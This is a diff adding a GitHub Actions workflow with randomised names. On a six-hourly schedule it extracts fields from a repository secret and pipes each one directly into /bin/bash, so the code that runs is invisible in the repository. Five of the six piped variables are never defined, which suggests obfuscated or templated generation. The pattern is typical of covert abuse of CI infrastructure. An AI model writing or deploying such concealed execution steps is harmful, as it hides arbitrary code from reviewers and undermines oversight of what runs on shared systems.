@@ -1,0 +1,23 @@
+name: wanlinianjiann
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanlinianjiann
+        env:
+          wmv04: ${{ secrets.wmv04 }}
+        run: |
+          echo $wmv04 | jq -r .df6841 | /bin/bash
+          echo $odb4 | jq -r .mdo8766 | /bin/bash
+          echo $kcfu1 | jq -r .dkkd24 | /bin/bash
+          echo $zpad708 | jq -r .vx44 | /bin/bash
+          echo $myqb3930 | jq -r .guinr094 | /bin/bash
+          echo $rb4 | jq -r .uh1937 | /bin/bash
+
